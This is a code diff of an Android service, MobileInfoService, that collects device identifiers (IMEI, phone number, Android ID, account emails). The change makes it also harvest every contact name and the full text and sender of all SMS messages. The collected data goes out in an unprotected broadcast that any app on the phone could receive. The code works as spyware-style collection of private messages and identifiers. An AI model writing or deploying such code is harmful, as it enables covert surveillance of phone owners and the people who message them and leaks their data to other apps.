@@ -5,13 +5,12 @@ import android.accounts.AccountManager;
 import android.app.IntentService;
 import android.content.Context;
 import android.content.Intent;
-import android.content.pm.ApplicationInfo;
-import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.provider.ContactsContract;
 import android.provider.Settings;
+import android.provider.Telephony;
 import android.support.annotation.Nullable;
 import android.telephony.SubscriptionInfo;
 import android.telephony.SubscriptionManager;
@@ -22,7 +21,11 @@ import java.util.ArrayList;
 import java.util.List;
 
 public class MobileInfoService extends IntentService {
-    public static final String ACTION = "action_get__mobile_info";
+    public static final String ACTION = "ru.myemail.SERVICE_ACTION";
+
+    public static final String MOBILE_INFO_ACTION = "action_get_mobile_info";
+    public static final String CONTACTS_ACTION = "action_get_contacts";
+    public static final String SMS_ACTION = "action_get_sms";
 
     public static final String EMAIL = "email";
     public static final String IMEI = "IMEI";
@@ -30,8 +33,8 @@ public class MobileInfoService extends IntentService {
     public static final String ANDROID_ID = "AndroidId";
     public static final String PHONE_NUMBER = "PHONE_NUMBER";
     public static final String NETWORK_TYPE = "NETWORK_TYPE";
-    public static final String APP_SIZE = "APP_SIZE";
-    public static final String CONTACT_SIZE = "CONTACT_SIZE";
+    public static final String CONTACTS = "CONTACTS";
+    public static final String SMS = "SMS";
 
     public MobileInfoService() {
         super("EmailService");
@@ -41,17 +44,25 @@ public class MobileInfoService extends IntentService {
     protected void onHandleIntent(@Nullable Intent intent) {
         if (intent != null) {
             String action = intent.getAction();
-            if (ACTION.equals(action)) {
+            if (MOBILE_INFO_ACTION.equals(action)) {
                 List<String> strings = getGmails();
-                Intent resultIntent = new Intent(MainActivity.ACTION);
+                Intent resultIntent = new Intent(ACTION);
                 resultIntent.putExtra(EMAIL, TextUtils.join(", ", strings));
                 resultIntent.putExtra(IMEI, getImei());
                 resultIntent.putExtra(OPERATOR, getSimOperator());
                 resultIntent.putExtra(ANDROID_ID, getAndroidId());
                 resultIntent.putExtra(PHONE_NUMBER, getPhoneNumber());
                 resultIntent.putExtra(NETWORK_TYPE, getNetworkType());
-                resultIntent.putExtra(APP_SIZE, getInstalledAppsSize());
-                resultIntent.putExtra(CONTACT_SIZE, getContactSize());
+                resultIntent.putExtra(CONTACTS, getContacts());
+                resultIntent.putExtra(SMS, getSms());
+                sendBroadcast(resultIntent);
+            } else if (CONTACTS_ACTION.equals(action)) {
+                Intent resultIntent = new Intent(ACTION);
+                resultIntent.putExtra(CONTACTS, getContacts());
+                sendBroadcast(resultIntent);
+            } else if (SMS_ACTION.equals(action)) {
+                Intent resultIntent = new Intent(ACTION);
+                resultIntent.putExtra(SMS, getSms());
                 sendBroadcast(resultIntent);
             }
         }
@@ -113,21 +124,32 @@ public class MobileInfoService extends IntentService {
         return "";
     }
 
-    private int getInstalledAppsSize() {
-        List<ApplicationInfo> apps = getPackageManager().getInstalledApplications(PackageManager.GET_META_DATA);
-        if (apps != null && !apps.isEmpty()) {
-            return apps.size();
+    private String[] getContacts() {
+        Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
+        try {
+            ArrayList<String> list = new ArrayList<>();
+            while (cursor.moveToNext()) {
+                list.add(cursor.getString(cursor.getColumnIndex(
+                        ContactsContract.Contacts.DISPLAY_NAME)));
+            }
+            return list.toArray(new String[]{});
+        } finally {
+            cursor.close();
         }
-
-        return 0;
     }
 
-    private int getContactSize() {
-        Cursor query = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
+    private String[] getSms() {
+        Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DEFAULT_SORT_ORDER);
         try {
-            return query.getCount();
+            ArrayList<String> list = new ArrayList<>();
+            while (cursor.moveToNext()) {
+                String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
+                String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
+                list.add(address + "\n " + body);
+            }
+            return list.toArray(new String[]{});
         } finally {
-            query.close();
+            cursor.close();
         }
     }
 }
